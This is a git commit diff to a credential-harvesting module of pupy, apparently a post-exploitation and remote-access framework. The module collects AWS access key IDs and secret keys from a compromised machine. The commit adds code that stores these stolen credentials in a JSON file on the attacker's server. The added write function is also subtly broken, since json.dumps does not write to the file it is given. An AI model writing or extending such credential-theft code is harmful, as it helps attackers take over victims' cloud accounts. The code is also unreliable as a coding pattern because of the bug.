95fb258bcf15de32b60057fc177fa8e044d6aed0
Bradley Wilson-Hunt <bwilsonhunt@gmail.com>
2017-03-27 16:39:14 +0100

    Writing the output to json file on the pupy server

--- pupy/modules/aws_credentials.py
+++ pupy/modules/aws_credentials.py
@@ -3,6 +3,8 @@
 # Contributor(s):
 
 from pupylib.PupyModule import *
+from os import path, makedirs
+import json
 
 __class_name__ = "AWSCredentials"
 
@@ -28,5 +30,19 @@ class AWSCredentials(PupyModule):
                 self.log("Location: %s" % item['location'])
                 self.log("Access key ID: %s" % item['aws_access_key_id'])
                 self.log("Access secret key: %s" % item['aws_secret_access_key'])
+            self.create_dir()
+            self.write_to_file(aws_creds.creds_found)
         else:
             self.log("Couldn't find anything ;(")
+
+    def create_dir(self):
+        try:
+            if not path.isdir(path.join("data", "aws_creds")):
+                makedirs(path.join("data", "aws_creds"))
+        except Exception as error:
+            self.error("Couldn't create the directory data/aws_creds: {error}".format(error=error))
+
+    def write_to_file(self, data):
+        with open(path.join("data", "aws_creds", "creds.json"), 'w') as outfile:
+            self.log("Writing creds data to file in data/aws_creds/creds.json")
+            json.dumps(data, outfile, sort_keys=True, indent=4, ensure_ascii=False)
